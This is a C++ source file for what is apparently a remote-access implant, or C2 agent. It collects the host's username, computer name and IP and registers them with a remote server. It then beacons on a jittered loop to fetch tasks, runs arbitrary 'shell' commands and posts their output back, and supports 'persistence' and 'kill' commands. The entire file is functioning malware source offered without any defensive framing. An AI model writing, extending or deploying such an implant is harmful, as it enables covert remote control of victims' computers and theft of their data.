#include <nlohmann/json.hpp>
#include <iostream>
#include <string>
#include <curl/curl.h> 
#include <chrono>
#include <thread>
#include <ctime>
#include <sstream>


#include "core.h"
#include "Implant.h"
#include "variables.h"
#include <future>



using json = nlohmann::json;

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* responseData) {
    size_t totalSize = size * nmemb;
    responseData->append((char*)(contents), totalSize);
    return totalSize;
}

void Implant::setJitter(int sleep) {
    this->jitter = sleep;
}

std::string Implant::getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();

    std::time_t now_c = std::chrono::system_clock::to_time_t(now);
    std::tm local_time;
    localtime_s(&local_time, &now_c); // Using localtime_s for thread safety
    std::ostringstream ss;
    ss << std::put_time(&local_time, "%Y-%m-%d %X"); // Format as YYYY-MM-DD HH:MM:SS

    return ss.str(); 
}

Implant::Implant (BasicUserInformation& basicUserInfo)
	:basicUserInfo(basicUserInfo) // Properly initialize with the passed reference
{
	// No need to initialize basicUserInfo with default values here, as it is a reference.
	if (!(GetBasicUserInformation(basicUserInfo))) {
		printf("Failed to Get Basic User Information");
	}

	this->IP = GetUserIP(); // DONE
}

json Implant::getData(const json& params, const std::string& endpoint) {
    CURL* curl;
    CURLcode res;
    std::string response;
    json jsonResponse;

    // Initialize CURL
    curl = curl_easy_init();

    if (curl) {

        // Construct the URL with query parameters, could not find a way to pass JSON as a body
        std::string url = endpoint;

        // Append parameters to the URL
        if (!params.empty()) {
            url += "?";
            for (auto it = params.begin(); it != params.end(); ++it) {
                url += it.key() + "=" + curl_easy_escape(curl, it.value().get<std::string>().c_str(), 0) + "&"; //
            }
            url.pop_back();  // Remove the trailing '&', removes the last element of the string after everthing is done
        }

        // Set the URL for the GET request
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        // Set up to capture the response
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Enable verbose output for debugging
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        // Perform the request
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK) {
            std::cerr << "CURL error: " << curl_easy_strerror(res) << std::endl;
            jsonResponse = { {"error", "CURL request failed"}, {"message", curl_easy_strerror(res)} };
        }
        else {

            try {
                jsonResponse = json::parse(response);
            }
            catch (const json::parse_error& e) {
                std::cerr << "JSON parse error: " << e.what() << std::endl;
                jsonResponse = { {"error", "Failed to parse response as JSON"} };
            }
        }

        curl_easy_cleanup(curl);
    }
    else {
        jsonResponse = { {"error", "CURL initialization failed"} };
    }

    return jsonResponse;
}

STATUS_CODE Implant::sendData(const json& data, const std::string& endpoint) {
    CURL* curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, endpoint.c_str());

        std::string jsonData = data.dump();
        if (jsonData.empty()) {
            std::cerr << "Error: JSON payload is empty." << std::endl;
            return STATUS_CODE::NOT_DONE;
        }
        std::cout << "Sending JSON: " << jsonData << std::endl;  // Debugging output

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, jsonData.size());

        struct curl_slist* headers = NULL;

        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(jsonData.size())).c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback); // 
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        else {
            // Check HTTP response code
            long httpCode = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpCode);

            if (httpCode == 200 || httpCode == 201 || httpCode == 409) {
                std::cout << "Server Response: " << response << std::endl;
                return STATUS_CODE::DONE;
            }
            else {
                std::cerr << "Error: Received HTTP response code " << httpCode << " instead of 200/201." << std::endl;
                return STATUS_CODE::NOT_REGISTERED;
            }
        }
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }

    if (res == CURLE_OK) {
        return STATUS_CODE::DONE;
    }

    else {
        return STATUS_CODE::NOT_DONE;

    }
}






void Implant::RegisterImplant()
{
	json registrationData = {
		{"username", basicUserInfo.UserName},
		{"status", "active"},
		{"computerName", basicUserInfo.ComputerName},
		{"ip", this->IP},
        {"agentId", id}
	};
	
    bool isRegistered = false;

    while (!isRegistered) {
        switch (sendData(registrationData, registerUrl)) {
        case STATUS_CODE::DONE: {
            std::cout << "Registration complete." << std::endl;
            isRegistered = true; // This will stop the loop
            break;
        }
        case STATUS_CODE::NOT_DONE: {
            std::cout << "Registration not yet complete. Retrying..." << std::endl;
            break;
        }
        case STATUS_CODE::NOT_REGISTERED: {
            std::cout << "User is not registered. Please check your registration data." << std::endl;
            isRegistered = true;
            break;
        }
        }

        if (!isRegistered) {
            std::this_thread::sleep_for(std::chrono::milliseconds(jitter));
        }
    }

}

void Implant::StopBeacon() {
    exit(1);
}

void Implant::StartBeacon() {
    this->Beacon();
}

void Implant::Beacon() {

    bool isRunning = true;
    while (isRunning) {
        Implant::FetchTasks();
        std::this_thread::sleep_for(std::chrono::milliseconds(this->jitter));
    }

}

void Implant::FetchTasks() {

    json taskData{
        {"agentId", id},
        {"status", "pending"}
    };

    std::cout << "Task Data: " << taskData << "\n";

    json response = getData(taskData, taskUrl);
    std::cout << "Response From Tasks: " << response << std::endl;

    if (response.is_array()) {
        parseTasks(response);

        for (const auto& task : tasks) {
            // Return iterator matching to task.id or the end if no such exists, if it is not found in the taskIDs
            // Instead of comparing each id, we can simplify this into one line, using modern c++ (Check C++ crash course for more information)


            if (std::find(executedTaskIds.begin(), executedTaskIds.end(), task.taskId) == executedTaskIds.end()) { // If not found in the executed tasks ... 
                std::async(std::launch::async, &Implant::executeTask, this, task); // Then we launch this thread, then we push the taskID into the executedTaskIds.
                executedTaskIds.push_back(task.taskId); // then push it onto the taskIds that are executed.
            }
        }

        tasks.clear(); // Don't run it again after we finish running the tasks!
    }
}

void Implant::parseTasks(const json& response) {
    for (const auto& taskJson : response) {
        // Check if the task status is "pending", we dont want to finish already finished tasks.
        if (taskJson.contains("status") && taskJson["status"] == "pending") {
            Task newTask;

            // Assuming taskName corresponds to the "command" field
            newTask.taskName = taskJson["command"]; // New task is a structure
            newTask.taskId = taskJson["_id"]; 
            newTask.taskData = taskJson; 

            // Only add this task if it hasn't been executed.
            if (std::find(executedTaskIds.begin(), executedTaskIds.end(), newTask.taskId) == executedTaskIds.end()) {
                tasks.push_back(newTask); // Add the task to the vector if it hasn't been executed yet
            }
        }
    }
}

void Implant::executeTask(const Task& task) {

    std::cout << "Executing task: " << task.taskName << std::endl;

    std::string command = task.taskData["command"];
    std::string args = task.taskData["arguments"];

    if (command == "shell") {
        std::string response = exec(args);
        std::string date = this->getCurrentDateTime();

        json jsonResponse = {
            {"taskId", task.taskData["_id"]},
            {"status", "completed"},
            {"output", response},
            {"completedAt", date}

        };

        bool sent = true;

        while (sent) {
            if (sendData(jsonResponse, updateTaskUrl) == STATUS_CODE::NOT_DONE) {
                std::cout << "ERROR SENDING TASK" << std::endl;
            }

            sent = false;
        }

        std::cout <<"DONE SENDING: " << task.taskName << std::endl;

    }

    else if (command == "kill") {
        std::string date = this->getCurrentDateTime();

        json jsonResponse = {
            {"taskId", task.taskData["_id"]},
            {"status", "completed"},
            {"output", "DONE"},
            {"completedAt", date}

        };

        bool sent = true;

        while (sent) {
            if (sendData(jsonResponse, updateTaskUrl) == STATUS_CODE::NOT_DONE) {
                std::cout << "ERROR SENDING TASK" << std::endl;
            }

            sent = false;
        }

        std::cout << "DONE SENDING: " << task.taskName << std::endl;

        this->StopBeacon();
    }

    else if (command == "persistence") {
        std::string date = this->getCurrentDateTime();
        json jsonResponse = {
             {"taskId", task.taskData["_id"]},
             {"status", "completed"},
             {"output", "Done"},
             {"completedAt", date}
        };

        if (!persistence()) {
            json jsonResponse = {
                {"taskId", task.taskData["_id"]},
                {"status", "completed"},
                {"output", "ERROR PERSISTING"},
                {"completedAt", date}

            };
        }


        bool sent = true;

        while (sent) {
            if (sendData(jsonResponse, updateTaskUrl) == STATUS_CODE::NOT_DONE) {
                std::cout << "ERROR SENDING TASK" << std::endl;
            }

            sent = false;
        }

        std::cout << "DONE SENDING: " << task.taskName << std::endl;



    }

    else {
        std::cout << "COMMAND NOT FOUND" << std::endl;
    }
}